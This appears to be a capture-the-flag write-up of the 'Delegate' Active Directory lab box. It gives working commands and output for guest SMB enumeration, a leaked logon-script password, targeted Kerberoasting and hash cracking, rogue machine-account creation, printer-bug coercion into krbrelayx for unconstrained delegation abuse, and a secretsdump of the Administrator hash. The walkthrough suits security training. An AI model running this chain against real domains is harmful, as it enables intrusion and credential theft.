---
title: "HTB: Delegate - GenericWrite, Targeted Kerberoast & Unconstrained Delegation"
date: 2026-05-26
draft: false
tags: ["Active Directory", "Windows", "HackTheBox", "Unconstrained Delegation", "Kerberoasting", "GenericWrite"]
categories: ["Writeups"]
description: "Walkthrough of the Delegate Windows Active Directory box: guest SMB access to a credential-leaking logon script, targeted Kerberoasting via GenericWrite, and abusing SeEnableDelegationPrivilege for an Unconstrained Delegation attack to Domain Admin."
target_ip: "10.129.234.69"
os: Windows
difficulty: Medium
status: Complete
platforms: ["HackTheBox"]
oses: ["Windows"]
difficulties: ["Medium"]
---

# 🚩 Box Name: Delegate

## 📋 Initial Info
- **Hostname:** `delegate.vl`

Delegate is a medium-difficulty Windows machine focused heavily on Active Directory abuse and delegation attacks. The box starts off with an exposed guest account, which can be leveraged to access files containing hardcoded credentials. Those credentials provide `WriteProperty` permissions over another domain user that already has WinRM access to the Domain Controller. After compromising that account, the attack path shifts into delegation abuse since the user has the `SeEnableDelegationPrivilege` privilege assigned. With that privilege, it's possible to modify the `TRUSTED_FOR_DELEGATION` flag on AD objects and ultimately abuse Unconstrained Delegation to escalate privileges further within the domain.

---

## 🔍 Reconnaissance

### 📡 Port Scanning (Nmap)
> [!TIP] Scan Command
> `sudo nmap -A -T4 -p- -oN nmap/initial <IP>`

```shell
Nmap done: 1 IP address (1 host up) scanned in 4.32 seconds
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-25 12:17 CDT
Nmap scan report for 10.129.234.69
Host is up (0.062s latency).
Not shown: 65508 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-25 17:19:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: DELEGATE
|   NetBIOS_Domain_Name: DELEGATE
|   NetBIOS_Computer_Name: DC1
|   DNS_Domain_Name: delegate.vl
|   DNS_Computer_Name: DC1.delegate.vl
|   DNS_Tree_Name: delegate.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-25T17:20:43+00:00
|_ssl-date: 2026-05-25T17:21:22+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC1.delegate.vl
| Not valid before: 2026-05-24T16:54:39
|_Not valid after:  2026-11-23T16:54:39
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
60114/tcp open  msrpc         Microsoft Windows RPC
60235/tcp open  msrpc         Microsoft Windows RPC
62596/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-05-25T17:20:45
|_  start_date: N/A

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   58.79 ms 10.10.14.1
2   66.87 ms 10.129.234.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 264.37 seconds
```

From the nmap scan this looks like a Domain Controller. I will next add `delegate.vl` and `dc1.delegate.vl` to my `etc/hosts` file.

### SMB Enumeration

Initially it seems like I'm going to need credentials to access SMB.

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc smb 10.129.234.69 -u '' -p ''                                                                                                                                         ──(Mon,May25)─┘
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\:
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc smb 10.129.234.69 -u '' -p '' --shares                                                                                                                                ──(Mon,May25)─┘
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\:
SMB         10.129.234.69   445    DC1              [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

`STATUS_ACCESS_DENIED`

I always like to use a random name to see if  the `Guest Account` is enabled. In this case it is!

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc smb 10.129.234.69 -u 'bob' -p '' --shares                                                                                                                             ──(Mon,May25)─┘
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\bob: (Guest)
SMB         10.129.234.69   445    DC1              [*] Enumerated shares
SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
SMB         10.129.234.69   445    DC1              -----           -----------     ------
SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
SMB         10.129.234.69   445    DC1              C$                              Default share
SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share
SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
```

Looks like I can read a few Shares. There are several tools you can use to enumerate SMB shares. This is just one of many methods.

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ smbclient //10.129.234.69/SYSVOL -U bob                                                                                                                                   ──(Mon,May25)─┘
Password for [WORKGROUP\bob]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep  9 08:52:30 2023
  ..                                  D        0  Sat Aug 26 04:39:25 2023
  delegate.vl                        Dr        0  Sat Aug 26 04:39:25 2023

                4652287 blocks of size 4096. 1164015 blocks available
smb: \> cd delegate.vl\
smb: \delegate.vl\> ls
  .                                   D        0  Sat Aug 26 04:45:45 2023
  ..                                  D        0  Sat Aug 26 04:39:25 2023
  DfsrPrivate                      DHSr        0  Sat Aug 26 04:45:45 2023
  Policies                            D        0  Sat Aug 26 04:39:30 2023
  scripts                             D        0  Sat Aug 26 07:45:24 2023

                4652287 blocks of size 4096. 1164014 blocks available

smb: \delegate.vl\> cd scripts
smb: \delegate.vl\scripts\> ls
  .                                   D        0  Sat Aug 26 07:45:24 2023
  ..                                  D        0  Sat Aug 26 04:45:45 2023
  users.bat                           A      159  Sat Aug 26 07:54:29 2023

                4652287 blocks of size 4096. 1164013 blocks available
smb: \delegate.vl\scripts\> mget users.bat
Get file users.bat? yes
getting file \delegate.vl\scripts\users.bat of size 159 as users.bat (0.6 KiloBytes/sec) (average 0.6 KiloBytes/sec)
```

Found something interesting. I'm going to upload the file to get a better look at it.

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ cat users.bat                                                             ──(Mon,May25)─┘
rem @echo off
net use * /delete /y
net use v: \\dc1\development

if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ssw0rd1#123%
```

Got some Credentials!

I next tried these credentials and was unable to login with them. Time to find some users and do some password spraying. I know that the format is first initial, period, last name. This is useful because I could use a tool like `kerbrute` and a wordlist with this formatting of random names. However I'm going to first use a `netexec` feature to obtain valid users. It works.

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc smb 10.129.234.69 -u 'bob' -p '' --rid-brute 10000                                                                                                                    ──(Mon,May25)─┘
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\bob: (Guest)
SMB         10.129.234.69   445    DC1              498: DELEGATE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              500: DELEGATE\Administrator (SidTypeUser)
SMB         10.129.234.69   445    DC1              501: DELEGATE\Guest (SidTypeUser)
SMB         10.129.234.69   445    DC1              502: DELEGATE\krbtgt (SidTypeUser)
SMB         10.129.234.69   445    DC1              512: DELEGATE\Domain Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              513: DELEGATE\Domain Users (SidTypeGroup)
SMB         10.129.234.69   445    DC1              514: DELEGATE\Domain Guests (SidTypeGroup)
SMB         10.129.234.69   445    DC1              515: DELEGATE\Domain Computers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              516: DELEGATE\Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              517: DELEGATE\Cert Publishers (SidTypeAlias)
SMB         10.129.234.69   445    DC1              518: DELEGATE\Schema Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              519: DELEGATE\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              520: DELEGATE\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.69   445    DC1              521: DELEGATE\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              522: DELEGATE\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.69   445    DC1              525: DELEGATE\Protected Users (SidTypeGroup)
SMB         10.129.234.69   445    DC1              526: DELEGATE\Key Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              527: DELEGATE\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.69   445    DC1              553: DELEGATE\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.69   445    DC1              571: DELEGATE\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.69   445    DC1              572: DELEGATE\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.69   445    DC1              1000: DELEGATE\DC1$ (SidTypeUser)
SMB         10.129.234.69   445    DC1              1101: DELEGATE\DnsAdmins (SidTypeAlias)
SMB         10.129.234.69   445    DC1              1102: DELEGATE\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.69   445    DC1              1104: DELEGATE\A.Briggs (SidTypeUser)
SMB         10.129.234.69   445    DC1              1105: DELEGATE\b.Brown (SidTypeUser)
SMB         10.129.234.69   445    DC1              1106: DELEGATE\R.Cooper (SidTypeUser)
SMB         10.129.234.69   445    DC1              1107: DELEGATE\J.Roberts (SidTypeUser)
SMB         10.129.234.69   445    DC1              1108: DELEGATE\N.Thompson (SidTypeUser)
SMB         10.129.234.69   445    DC1              1121: DELEGATE\delegation admins (SidTypeGroup)
```

Next I'm going to compile these names into a wordlist so I can do some password spraying if I need to later. Password re-use is very common and a serious problem in most organizations. It's always worth a try. However I'm going to first see if the credentials work for `A.Briggs`

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc smb 10.129.234.69 -u 'A.Briggs' -p 'P4ssw0rd1#123'                                                                                                                    ──(Mon,May25)─┘
SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.69   445    DC1              [+] delegate.vl\A.Briggs:P4ssw0rd1#123
```

Nice!

Now with credentials we can further enumerate the domain. This user does not have winrm access so we are going to look for another way in.

### Firing Up BloodHound

##### rusthound-ce

There are many ways to collect BloodHound data. This is one of may ways to do it. I like `rusthound-ce` because it also collects certificate data.

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ rusthound-ce -d delegate.vl -i 10.129.234.69 -u a.briggs -p 'P4ssw0rd1#123' -v                                                                                            ──(Mon,May25)─┘
---------------------------------------------------
Initializing RustHound-CE at 13:11:07 on 05/25/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-05-25T18:11:07Z INFO  rusthound_ce] Verbosity level: Debug
[2026-05-25T18:11:07Z INFO  rusthound_ce] Collection method: All
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] IP: 10.129.234.69
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] PORT: not set
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] FQDN: not set
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] Url: ldap://10.129.234.69
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] Domain: delegate.vl
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] Username: a.briggs@delegate.vl
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] Email: a.briggs@delegate.vl
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] Password: P4ssw0rd1#123
[2026-05-25T18:11:07Z DEBUG rusthound_ce::ldap] DC: ["DC=delegate,DC=vl", "CN=Configuration,"]

<snip>

[2026-05-25T18:11:13Z INFO  rusthound_ce::json::maker::common] .//20260525131113_delegate-vl_gpos.json created!
[2026-05-25T18:11:13Z DEBUG rusthound_ce::json::maker::common] Making containers.json
[2026-05-25T18:11:13Z INFO  rusthound_ce::json::maker::common] 73 containers parsed!
[2026-05-25T18:11:13Z INFO  rusthound_ce::json::maker::common] .//20260525131113_delegate-vl_containers.json created!

RustHound-CE Enumeration Completed at 13:11:13 on 05/25/26! Happy Graphing!
```

Now I uploaded the `.json` files onto `BloodHound`. Let's see if there is anything interesting.

![BloodHound data showing A.Briggs with GenericWrite over N.Thompson](/images/delegate/bh_data.png)

`A.Briggs` has `GenericWrite` over the user `N.Thompson`. If we can gain access to this user we can Remote into the machine.

**GenericWrite**
- Write access to many object attributes (e.g., `member`, `description`, `logonHours`) but **not full control**.
- **Abuse**: You can **modify certain attributes** (like `servicePrincipalName` or `scriptPath`) to gain **RCE** or perform **kerberoasting** or **privilege escalation**.

I'm going to attempt a `Shadow credential attack`. We can either use the tools `pywhisker.py` or `bloodyAD`

---

## ⚡ Exploitation (Initial Access)
### Shadow Credentials Attack

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ pywhisker -d delegate.vl -u a.briggs -p 'P4ssw0rd1#123' --target n.thompson --action add                                                                                  ──(Mon,May25)─┘
[*] Searching for the target account
[*] Target user found: CN=N.Thompson,CN=Users,DC=delegate,DC=vl
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 11e18c15-2120-87b0-5ccb-8dfecac0336e
[*] Updating the msDS-KeyCredentialLink attribute of n.thompson
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: JMibo34Q.pfx
[*] Must be used with password: nSpuhN8QxhuiXOQNu88I
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

The output provides three essentials:
1. `KeyCredential DeviceID,`
2. Name of the certificate (in this case, JMibo34Q.pfx).
3. Certificate's password `nSpuhN8QxhuiXOQNu88I`.

Use these values with `PKINITtools` to get a TGT as `N.Thompson`.

**Fail**
```shell
(PKINIT) ┌─[split@parrot:~/Tools/PKINITtools]
└─❯ python3 gettgtpkinit.py -cert-pfx ~/Documents/HTB/Delegate/JMibo34Q.pfx -pfx-pass nSpuhN8QxhuiXOQNu88I 'delegate.vl/n.thompson' n.thompson.ccache
2026-05-25 15:01:00,398 minikerberos INFO     Loading certificate and key from file
2026-05-25 15:01:00,414 minikerberos INFO     Requesting TGT
Traceback (most recent call last):
  File "/home/split/Tools/PKINITtools/gettgtpkinit.py", line 349, in <module>
    main()
    ~~~~^^
  File "/home/split/Tools/PKINITtools/gettgtpkinit.py", line 345, in main
    amain(args)
    ~~~~~^^^^^^
  File "/home/split/Tools/PKINITtools/gettgtpkinit.py", line 315, in amain
    res = sock.sendrecv(req)
  File "/home/split/Tools/PKINITtools/PKINIT/lib/python3.13/site-packages/minikerberos/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"
```

I initially planned to abuse shadow credentials against `n.thompson`, but the attack failed with the error `KDC_ERR_PADATA_TYPE_NOSUPP`. After digging into it a bit more, I found that the domain was not configured for AD CS, and the Domain Controller did not have a certificate or key pair configured for PKINIT authentication. Because of that, the DC could not process the certificate-based authentication request required for the shadow credentials attack.

For a shadow credentials attack to work, a few conditions need to be met:

1. The domain must support PKINIT and have at least one Domain Controller running Windows Server 2016 or newer.
2. The Domain Controller must have its own certificate and key pair configured, which is commonly present when AD CS or another Certificate Authority is deployed.
3. The attacker must have permissions to modify the target account's `msDS-KeyCredentialLink` attribute.

### targetedKerberoast

```shell
(Kerberoast) ┌─[split@parrot:~/Tools/targetedKerberoast]
└─❯ python3 targetedKerberoast.py -d delegate.vl -u a.briggs -p 'P4ssw0rd1#123' --request-user n.thompson
[*] Starting kerberoast attacks
[*] Attacking user (n.thompson)
[+] Printing hash for (N.Thompson)
$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$137191ada5e203ea027b03c5b834ca2e$<SNIP>
```

I'm successful and now have a Kerberos hash.

Next I'll attempt to crack it with either `hashcat` or `johntheripper`.

##### Hashcat

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ hashcat -m 13100 N.ThompsonHash /usr/share/wordlists/rockyou.txt     255 ↵ ──(Mon,May25)─┘
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz, 6734/13532 MB (2048 MB allocatable), 2MCU

<snip>

$krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.Thompson*$137191ada5e203ea027b03c5b834ca2e$<SNIP>:KALEB_2341

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*N.Thompson$DELEGATE.VL$delegate.vl/N.T...3f49ae
Time.Started.....: Mon May 25 15:16:56 2026 (12 secs)
Time.Estimated...: Mon May 25 15:17:08 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   883.5 kH/s (2.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 11003904/14344385 (76.71%)
Rejected.........: 0/11003904 (0.00%)
Restore.Point....: 11001856/14344385 (76.70%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: KANGOL1 -> KACITA
Hardware.Mon.#1..: Util: 91%

Started: Mon May 25 15:16:54 2026
Stopped: Mon May 25 15:17:10 2026
```

It cracked very fast with a simple wordlist. Now we have some more credentials and should be able to `winrm`!

`N.Thompson:KALEB_2341`

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc winrm 10.129.234.69 -u 'N.Thompson' -p 'KALEB_2341'                    ──(Mon,May25)─┘
WINRM       10.129.234.69   5985   DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl)
WINRM       10.129.234.69   5985   DC1              [+] delegate.vl\N.Thompson:KALEB_2341 (Pwn3d!)
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ evil-winrm -i delegate.vl -u N.Thompson -p KALEB_2341                      ──(Mon,May25)─┘

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami
delegate\n.thompson
```

## 🛡️ Privilege Escalation

### Local Enumeration

```shell
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set    
```

`SeEnableDelegationPrivilege` this privilege sticks out as something dangerous.

`N.Thompson` is also part of the group Delegation Admin.

![BloodHound showing N.Thompson's group membership and privileges](/images/delegate/n.thompsonbhdata.png)

```shell
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-ADComputer -Filter {TrustedForDelegation -eq $True}


DistinguishedName : CN=DC1,OU=Domain Controllers,DC=delegate,DC=vl
DNSHostName       : DC1.delegate.vl
Enabled           : True
Name              : DC1
ObjectClass       : computer
ObjectGUID        : 3dc17337-6dde-4562-8fc7-50cdd3a94def
SamAccountName    : DC1$
SID               : S-1-5-21-1484473093-3449528695-2030935120-1000
UserPrincipalName :
```

`TRUSTED_FOR_DELEGATION` this Key Attribute tells me it's going to be an Unconstrained Delegation attack.

### Unconstrained Delegation

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ nxc ldap 10.129.234.69 -u 'n.thompson' -p 'KALEB_2341' -M maq             ──(Tue,May26)─┘
LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.234.69   389    DC1              [+] delegate.vl\n.thompson:KALEB_2341
MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccountQuota
MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
```

#### Create a Fake Computer

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ impacket-addcomputer -dc-ip 10.129.234.69 -computer-name evil$ -computer-pass 'Password123!' delegate.vl/n.thompson:KALEB_2341
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account evil$ with password Password123!.
```

#### Made it vulnerable to unconstrained delegation

Two examples of this using bloodyAD or the ActiveDirectory Powershell Module

bloodyAD
```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ bloodyAD --host 10.129.234.69 -u N.Thompson -p KALEB_2341 -d delegate.vl add uac -f TRUSTED_FOR_DELEGATION evil$
[+] ['TRUSTED_FOR_DELEGATION'] property flags added to evil$'s userAccountControl
```

ActiveDirectory Powershell Module
```powershell
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> Set-ADAccountControl -Identity evil$ -TrustedForDelegation $true
*Evil-WinRM* PS C:\Users\N.Thompson\Documents> Get-ADComputer -Identity evil$ -Properties TrustedForDelegation


DistinguishedName    : CN=evil,CN=Computers,DC=delegate,DC=vl
DNSHostName          :
Enabled              : True
Name                 : evil
ObjectClass          : computer
ObjectGUID           : 4c55df3d-51c5-4a78-9650-bb5f7d38c608
SamAccountName       : evil$
SID                  : S-1-5-21-1484473093-3449528695-2030935120-4601
TrustedForDelegation : True
UserPrincipalName    :
```

Created a Fake DNS record
```shell
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ python3 dnstool.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -r evil.delegate.vl -a add -t A -d 10.10.14.239 -dns-ip 10.129.234.69 DC1.delegate.vl                        ──(Tue,May26)─┘
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Craft SPN on the Target Computer
```shell
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vl' -t evil$ -dc-ip 10.129.234.69 DC1.delegate.vl --additional                     1 ↵ ──(Tue,May26)─┘
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

```shell
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p KALEB_2341 -s 'cifs/evil.delegate.vl' -t evil$ -dc-ip 10.129.234.69 DC1.delegate.vl
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Exploit

```shell
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ sudo python3 krbrelayx.py --krbsalt 'DELEGATEevil' --krbpass 'Password123!' --interface-ip 10.10.14.239
```

```shell
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ python3 printerbug.py delegate.vl/n.thompson:KALEB_2341@dc1.delegate.vl evil.delegate.vl
```

![krbrelayx capturing the DC's TGT via the printer bug](/images/delegate/exploit.png)

SecretsDump

```shell
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache             ──(Tue,May26)─┘
┌─[split@parrot:~/Tools/krbrelayx]
└─❯ impacket-secretsdump -k -no-pass -just-dc-ntlm -just-dc-user Administrator 'DC1$@dc1.delegate.vl'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c32198ceab4cc695e65045562aa3ee93:::
[*] Cleaning up...
```

```shell
┌─[split@parrot:~/Documents/HTB/Delegate]
└─❯ evil-winrm -i delegate.vl -u administrator -H c32198ceab4cc695e65045562aa3ee93

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
delegate\administrator
```

